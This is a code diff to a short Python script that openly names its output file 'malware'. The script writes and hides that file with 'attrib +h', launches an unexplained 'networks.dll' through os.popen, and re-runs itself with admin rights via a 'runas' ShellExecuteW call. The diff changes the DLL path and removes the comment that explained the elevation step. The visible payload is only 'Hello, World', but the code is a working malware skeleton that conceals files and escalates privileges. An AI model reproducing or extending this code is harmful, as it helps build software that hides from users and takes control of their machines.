@@ -3,7 +3,7 @@ malware_file_name = "malware.txt"
 def make_file_hidden(fileName):
     os.system("attrib +h " + fileName)
 
-os.popen("networks.dll")
+os.popen("data\\networks.dll")
 
 def is_admin():
     try:
@@ -15,7 +15,6 @@ if is_admin():
         f.write("Hello, World")
     make_file_hidden(malware_file_name)
 else:
-    # Re-run the program with admin rights
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 
 
